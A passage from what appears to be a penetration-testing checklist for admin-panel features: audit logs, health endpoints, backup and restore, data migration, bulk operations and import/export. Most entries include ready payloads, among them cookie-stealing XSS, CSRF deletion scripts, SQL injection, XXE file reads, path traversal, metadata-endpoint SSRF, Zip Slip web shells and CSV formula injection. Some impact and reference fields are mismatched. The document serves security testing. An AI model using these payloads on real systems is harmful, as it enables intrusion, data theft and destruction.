**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Audit Logs

**Test Steps:** 1. Export audit logs for own tenant. 2. Change tenant_id or organization_id in export request. 3. Check if logs from other organizations are included in the export. 4. Verify tenant isolation in exports.

**Expected Result:** Application must enforce tenant isolation in audit log exports and prevent cross-tenant log data leakage.

**Payload Example:**

```
GET /api/admin/audit-logs/export?tenant_id=TENANT-2001 with TENANT-1001 admin credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-036 — Missing Audit Logging for Critical Operations
**Test Category:** Logging (WSTG-CONF-09) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Audit Logs

**Test Steps:** 1. Perform all critical administrative operations. 2. Check if each operation generates an audit log entry. 3. Verify log completeness for user CRUD and role changes and settings modifications and data exports. 4. Test for logging gaps.

**Expected Result:** All critical administrative operations must generate complete audit log entries with timestamp and actor and action and target and result.

**Payload Example:**

```
Perform user creation;role change;settings modification;data export;backup;then verify each creates audit entry with all required fields
```

**Impact:** Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass.

**Tools:** Manual Review;Burp Suite

**References:** CWE-778; OWASP Logging &amp; Monitoring Failures (A09)

---

## ADMIN-037 — Audit Log Denial of Service
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Audit Logs

**Test Steps:** 1. Generate massive volume of logged events rapidly. 2. Check if log storage capacity is monitored. 3. Test if log DoS affects application performance. 4. Verify log rotation and retention policies.

**Expected Result:** Audit log infrastructure must handle high volumes without affecting application performance with proper rotation and retention and monitoring.

**Payload Example:**

```
Generate 100000+ logged events per minute;check for storage exhaustion;verify log rotation;monitor application performance impact
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite Intruder;JMeter;Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## ADMIN-038 — XSS in Audit Log Viewer
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Audit Logs

**Test Steps:** 1. Perform actions that include XSS payloads in logged fields. 2. View audit logs in admin panel. 3. Check if stored XSS executes when admins view log entries. 4. Test in log export views.

**Expected Result:** Application must encode all audit log data when rendering in the admin panel to prevent stored XSS attacks targeting security administrators.

**Payload Example:**

```
Perform action with username=<script>alert(document.cookie)</script>;view in audit log viewer;check export rendering
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADMIN-039 — Unauthorized Access to Health Monitoring
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** System Health Monitoring

**Test Steps:** 1. Access health monitoring endpoints without authentication. 2. Check common health check URLs. 3. Test with regular user credentials. 4. Check for exposed monitoring dashboards.

**Expected Result:** Application must restrict detailed health monitoring to authorized admin users and only expose minimal status on public health endpoints.

**Payload Example:**

```
GET /health;/status;/api/health;/actuator/health;/monitoring;/metrics;/api/admin/health with no or regular user credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;DirBuster

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-040 — Sensitive Information in Health Endpoints
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** System Health Monitoring

**Test Steps:** 1. Access all health monitoring endpoints. 2. Check for database connection details and server versions and internal IP addresses and memory usage and thread counts. 3. Verify information classification.

**Expected Result:** Health monitoring endpoints must not expose sensitive infrastructure details like database connections and internal IPs and server versions to unauthorized users.

**Payload Example:**

```
GET /actuator/env;/actuator/configprops;/health/details;check for db_host;db_password;internal_ip;server_version;stack_trace
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-041 — Health Endpoint SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** System Health Monitoring

**Test Steps:** 1. If health monitoring checks external services check for SSRF. 2. Modify health check URLs if configurable. 3. Point health checks to internal services. 4. Check for service discovery via health endpoints.

**Expected Result:** Application must not allow user-controlled health check URLs and must validate any configurable monitoring endpoints against allowlists.

**Payload Example:**

```
health_check_url=http://169.254.169.254/latest/meta-data/;monitor_endpoint=http://localhost:6379/;check_url=http://10.0.0.1:8080/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ADMIN-042 — Health Monitoring DoS via Expensive Checks
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** System Health Monitoring

**Test Steps:** 1. Trigger health check endpoints rapidly. 2. Check if expensive health checks like database queries or external API calls are rate limited. 3. Monitor for performance degradation from repeated health checks.

**Expected Result:** Application must rate limit health monitoring endpoints and implement caching for expensive health checks to prevent DoS through monitoring abuse.

**Payload Example:**

```
Send 1000+ GET /api/admin/health/detailed requests per minute;trigger expensive database health checks rapidly
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite Intruder;JMeter

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## ADMIN-043 — Actuator Endpoints Exposure (Spring Boot)
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** System Health Monitoring

**Test Steps:** 1. Check for exposed Spring Boot Actuator endpoints. 2. Test /actuator/env for environment variables. 3. Check /actuator/heapdump for memory dump. 4. Test /actuator/shutdown for application shutdown. 5. Check /actuator/jolokia for JMX access.

**Expected Result:** Application must disable or restrict all non-essential Actuator endpoints in production and require authentication for any exposed endpoints.

**Payload Example:**

```
GET /actuator;/actuator/env;/actuator/heapdump;/actuator/configprops;/actuator/beans;/actuator/mappings;/actuator/shutdown
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Nuclei;DirBuster

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-044 — Debug Endpoint Exposure
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** System Health Monitoring

**Test Steps:** 1. Check for exposed debug endpoints. 2. Test for phpinfo pages. 3. Check for profiler endpoints. 4. Test for debug toolbar access. 5. Verify debug mode is disabled in production.

**Expected Result:** All debug endpoints and tools must be disabled in production environments with no debug information accessible to any user.

**Payload Example:**

```
GET /debug;/phpinfo.php;/_debugbar;/profiler;/__debug__;/elmah.axd;/trace;/debug/pprof with no authentication
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;DirBuster;Nuclei

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-045 — Unauthorized Backup Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Backup / Restore

**Test Steps:** 1. Attempt to access backup management endpoints as non-admin. 2. List available backups. 3. Download backup files. 4. Check for backup files in predictable locations. 5. Test with different role levels.

**Expected Result:** Application must restrict all backup operations to authorized super-admin roles and store backups in secure non-web-accessible locations.

**Payload Example:**

```
GET /api/admin/backups;GET /api/admin/backups/download/latest;check /backups/;/backup/;/db-backup/ paths
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;DirBuster

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-046 — Backup File Path Traversal
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Backup / Restore

**Test Steps:** 1. Download a backup file. 2. Modify the file path parameter to traverse directories. 3. Attempt to read arbitrary server files. 4. Test with encoded traversal sequences.

**Expected Result:** Application must validate backup file paths strictly and prevent directory traversal in backup download functionality.

**Payload Example:**

```
GET /api/admin/backups/download?file=../../../etc/passwd;file=....//....//etc/shadow;file=%2e%2e%2f%2e%2e%2f
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;Postman

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## ADMIN-047 — Backup Contains Sensitive Unencrypted Data
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Backup / Restore

**Test Steps:** 1. Create a backup. 2. Download and inspect the backup file. 3. Check if backup contains plaintext passwords and API keys and encryption keys. 4. Verify backup encryption. 5. Check for PII exposure.

**Expected Result:** Backups must be encrypted at rest with strong encryption and must not contain plaintext sensitive data like passwords or encryption keys.

**Payload Example:**

```
Download backup file and search for password;api_key;secret_key;private_key;credit_card in plaintext
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Manual Review;Grep;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-048 — Unauthorized Restore Operation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Backup / Restore

**Test Steps:** 1. Attempt to trigger a restore operation as non-super-admin. 2. Restore from a manipulated backup file. 3. Check if restore requires re-authentication. 4. Verify restore confirmation workflow.

**Expected Result:** Application must restrict restore operations to super-admins with mandatory re-authentication and confirmation before executing any restore.

**Payload Example:**

```
POST /api/admin/backups/restore with regular admin credentials;restore without re-authentication challenge
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-049 — Backup Injection via Malicious Restore
**Test Category:** Injection (WSTG-INPV-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Backup / Restore

**Test Steps:** 1. Download a backup file. 2. Modify the backup contents to inject malicious data. 3. Inject SQL commands or admin users into the backup. 4. Upload the modified backup. 5. Trigger restore.

**Expected Result:** Application must validate backup file integrity using checksums or digital signatures and reject tampered backups.

**Payload Example:**

```
Modify backup SQL to add INSERT INTO users VALUES('hacker','admin');modify backup JSON to inject admin user;change backup checksum
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-050 — CSRF on Backup Deletion
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Backup / Restore

**Test Steps:** 1. Craft a malicious page that deletes all backups. 2. Lure super-admin to visit. 3. Check if backup deletion requires CSRF token and re-authentication.

**Expected Result:** Application must validate CSRF tokens and require re-authentication for destructive backup operations like deletion.

**Payload Example:**

```
<script>fetch('/api/admin/backups/delete-all',{method:'DELETE',credentials:'include'})</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ADMIN-051 — Backup Enumeration and Unauthorized Download
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Backup / Restore

**Test Steps:** 1. Enumerate backup file names by pattern or sequential naming. 2. Attempt direct URL access to backup files. 3. Check for backups in common paths. 4. Test for directory listing in backup storage.

**Expected Result:** Application must store backups in non-web-accessible locations with non-predictable filenames and require authentication for all access.

**Payload Example:**

```
Access /backups/backup-2025-01-01.sql;/backups/latest.tar.gz;enumerate date-based backup filenames
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite;DirBuster;ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## ADMIN-052 — Backup Scheduling Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Backup / Restore

**Test Steps:** 1. Modify backup schedule settings. 2. Set extremely frequent backups to exhaust storage. 3. Disable scheduled backups. 4. Check if schedule changes require authorization.

**Expected Result:** Application must restrict backup schedule modifications to authorized admins and enforce reasonable frequency limits.

**Payload Example:**

```
PUT /api/admin/backups/schedule with interval=every_minute;set enabled=false;change retention=0
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADMIN-053 — Data Migration SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Data Migration

**Test Steps:** 1. If data migration accepts SQL or query inputs inject SQL payloads. 2. Test migration configuration parameters. 3. Check for injection in source and destination connection strings. 4. Test field mapping for injection.

**Expected Result:** Application must use parameterized queries and validate all inputs in data migration processes.

**Payload Example:**

```
source_query=' OR 1=1--;migration_config=test'; DROP TABLE users;--;field_map=name' UNION SELECT password--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-054 — Data Migration Authorization Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Data Migration

**Test Steps:** 1. Attempt to trigger data migration as non-admin. 2. Access migration configuration endpoints. 3. Check if migration status is visible to unauthorized users. 4. Test with different role levels.

**Expected Result:** Application must restrict all data migration operations to authorized super-admin roles with mandatory approval workflows.

**Payload Example:**

```
POST /api/admin/migration/start with regular admin token;GET /api/admin/migration/status with non-admin credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-055 — Data Migration Sensitive Data Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Data Migration

**Test Steps:** 1. Monitor data migration process. 2. Check if migration logs expose sensitive data. 3. Verify if data is encrypted during migration. 4. Check for data exposure in temporary migration files.

**Expected Result:** Data migration must encrypt data in transit and at rest and migration logs must not contain sensitive data values.

**Payload Example:**

```
Check migration logs for plaintext passwords;credit_cards;SSN;check temporary files for unencrypted data dumps
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Manual Review;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADMIN-056 — Data Migration SSRF via Source Configuration
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Data Migration

**Test Steps:** 1. Configure data migration source. 2. Set source URL to internal network addresses. 3. Trigger migration. 4. Check if internal services are accessed through migration source.

**Expected Result:** Application must validate migration source URLs against allowlists and block access to internal network resources.

**Payload Example:**

```
source_url=http://169.254.169.254/latest/meta-data/;db_host=localhost;source=http://10.0.0.1:3306/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ADMIN-057 — Data Migration Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data Migration

**Test Steps:** 1. Trigger multiple simultaneous migration operations. 2. Check for data corruption from concurrent migrations. 3. Test for duplicate records. 4. Verify atomicity of migration transactions.

**Expected Result:** Application must prevent concurrent migration operations and implement proper locking to prevent data corruption.

**Payload Example:**

```
Trigger concurrent POST /api/admin/migration/start from multiple sessions;check for duplicate data and corruption
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ADMIN-058 — Data Migration Rollback Vulnerability
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Data Migration

**Test Steps:** 1. Start a data migration. 2. Interrupt it mid-process. 3. Check if partial migration leaves data in inconsistent state. 4. Test rollback functionality. 5. Verify data integrity after failed migration.

**Expected Result:** Application must implement atomic migration transactions with proper rollback capability to prevent data inconsistency from failed migrations.

**Payload Example:**

```
Interrupt POST /api/admin/migration/start mid-process;check data state;verify rollback restores consistent state
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADMIN-059 — Data Migration XXE via XML Import
**Test Category:** Injection (WSTG-INPV-07) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Data Migration

**Test Steps:** 1. If migration accepts XML data create XML with XXE payload. 2. Upload malicious XML for migration. 3. Check if external entities are resolved. 4. Test for blind XXE via out-of-band.

**Expected Result:** Application must disable external entity processing in all XML parsers used during data migration.

**Payload Example:**

```
<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><migration><data>&xxe;</data></migration>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite;OWASP ZAP

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## ADMIN-060 — Bulk Operation Authorization Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Bulk Operations

**Test Steps:** 1. Attempt bulk operations as non-admin. 2. Test bulk user deletion and role changes and status updates. 3. Check if individual item authorization is enforced in bulk. 4. Test with mixed authorized and unauthorized items.

**Expected Result:** Application must validate authorization for each individual item in a bulk operation and reject unauthorized items while processing authorized ones.

**Payload Example:**

```
POST /api/admin/bulk/delete with non-admin token;include items from different tenants in bulk operation
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-061 — Bulk Operation IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Bulk Operations

**Test Steps:** 1. Perform a bulk operation on own resources. 2. Include resource IDs from other tenants in the bulk array. 3. Check if cross-tenant resources are affected. 4. Test with mixed tenant IDs.

**Expected Result:** Application must verify ownership and tenant isolation for every item in bulk operations individually.

**Payload Example:**

```
POST /api/admin/bulk/update with ids=[1001;2001;3001] including IDs from other tenants
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADMIN-062 — Bulk Operation Denial of Service
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bulk Operations

**Test Steps:** 1. Submit a bulk operation with millions of items. 2. Check if item count limits are enforced. 3. Monitor server performance during large bulk operations. 4. Test for timeout and memory exhaustion.

**Expected Result:** Application must enforce maximum item counts on bulk operations and process large batches asynchronously with progress tracking.

**Payload Example:**

```
POST /api/admin/bulk/process with item_ids containing 1000000 IDs;check for count limits and async processing
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## ADMIN-063 — Bulk Operation SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Bulk Operations

**Test Steps:** 1. Submit bulk operation with SQL injection in item identifiers. 2. Test with injection in filter parameters used for bulk selection. 3. Check for SQL errors in bulk processing.

**Expected Result:** Application must use parameterized queries for all bulk operation database operations including item selection and processing.

**Payload Example:**

```
POST /api/admin/bulk/delete with ids=["1001' OR '1'='1"];filter=status=' OR 1=1-- in bulk select
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-064 — Bulk Operation Race Condition
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bulk Operations

**Test Steps:** 1. Submit the same bulk operation simultaneously from two sessions. 2. Check if items are processed twice. 3. Test for duplicate effects from concurrent bulk operations. 4. Verify idempotency.

**Expected Result:** Application must implement idempotent bulk operations with proper locking to prevent duplicate processing from concurrent submissions.

**Payload Example:**

```
Send concurrent POST /api/admin/bulk/process with same item_ids from two admin sessions
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ADMIN-065 — CSRF on Bulk Deletion
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bulk Operations

**Test Steps:** 1. Craft a malicious page that triggers bulk deletion of critical resources. 2. Lure admin to visit. 3. Check if CSRF token and confirmation are required for bulk destructive operations.

**Expected Result:** Application must validate CSRF tokens and require explicit confirmation for all bulk destructive operations.

**Payload Example:**

```
<script>fetch('/api/admin/bulk/delete',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"ids":["all"]}'})</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ADMIN-066 — Bulk Operation CSV Injection via Import
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Bulk Operations

**Test Steps:** 1. Upload a CSV for bulk import containing formula payloads. 2. Process the bulk import. 3. Export the data. 4. Check if formulas execute in spreadsheet applications.

**Expected Result:** Application must sanitize CSV data during bulk import by escaping formula-triggering characters.

**Payload Example:**

```
CSV: =cmd|'/C calc'!A0;+cmd|'/C calc'!A0;-cmd|'/C calc'!A0;@SUM(1+1)*cmd|'/C calc'!A0 in bulk import file
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Manual Testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADMIN-067 — Import File XXE Injection
**Test Category:** Injection (WSTG-INPV-07) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Tools

**Test Steps:** 1. If import tools accept XML create XML file with XXE payload. 2. Upload the malicious file. 3. Check if external entities are resolved. 4. Test for blind XXE and SSRF via XXE.

**Expected Result:** Application must disable external entity processing in all XML parsers used in import tools.

**Payload Example:**

```
Upload XML: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><import>&xxe;</import>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite;OWASP ZAP

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## ADMIN-068 — Import Tool Path Traversal
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Tools

**Test Steps:** 1. Import a file. 2. If file path is a parameter attempt directory traversal. 3. Test with ZIP files containing path traversal in filenames (Zip Slip). 4. Check for arbitrary file write.

**Expected Result:** Application must validate import file paths and archive contents to prevent directory traversal and arbitrary file write attacks.

**Payload Example:**

```
import_file=../../../etc/passwd;upload ZIP with ../../var/www/html/shell.php entry;test encoded traversal
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;evilarc;Custom Scripts

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## ADMIN-069 — Export Tool IDOR for Data Exfiltration
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Tools

